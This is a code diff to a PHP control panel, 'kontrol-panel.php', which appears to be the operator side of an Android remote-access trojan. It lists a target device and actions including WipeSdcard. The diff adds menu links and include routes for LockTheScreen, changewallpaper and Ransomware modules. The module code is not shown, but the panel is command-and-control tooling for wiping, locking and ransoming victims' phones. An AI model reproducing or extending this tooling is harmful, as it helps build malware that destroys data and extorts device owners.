@@ -75,6 +75,9 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
                 <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=7" class="list-group-item <?php if ($_GET['type']==7){ echo 'active';}?>">Chat</a> -->
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=8" class="list-group-item <?php if ($_GET['type']==8){ echo 'active';}?>">Toast</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=81" class="list-group-item <?php if ($_GET['type']==81){ echo 'active';}?>">WipeSdcard</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=82" class="list-group-item <?php if ($_GET['type']==82){ echo 'active';}?>">LockTheScreen</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=83" class="list-group-item <?php if ($_GET['type']==83){ echo 'active';}?>">changewallpaper</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=84" class="list-group-item <?php if ($_GET['type']==84){ echo 'active';}?>">Ransomware</a>
                 <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=9" class="list-group-item <?php if ($_GET['type']==9){ echo 'active';}?>">Screenshot</a> -->
                 <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=10" class="list-group-item <?php if ($_GET['type']==10){ echo 'active';}?>">Camera</a> -->
                 <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=11" class="list-group-item <?php if ($_GET['type']==11){ echo 'active';}?>">Scanner</a> -->
@@ -91,7 +94,7 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
             </div>
         </div>
 
-        <div class="col-lg-10">
+         <div class="col-lg-10">
 
             <?php
             if ($_GET['type']==1){
@@ -112,6 +115,12 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
                 include './modules/screen-message.php';
             } elseif ($_GET['type']==81){
                 include './modules/wipe.php';    
+            } elseif ($_GET['type']==82){
+                include './modules/LockTheScreen.php'; 
+            } elseif ($_GET['type']==83){
+                include './modules/changewallpaper.php'; 
+            } elseif ($_GET['type']==84){
+                include './modules/ransomware.php'; 
             } elseif ($_GET['type']==9){
 
             } elseif ($_GET['type']==10){
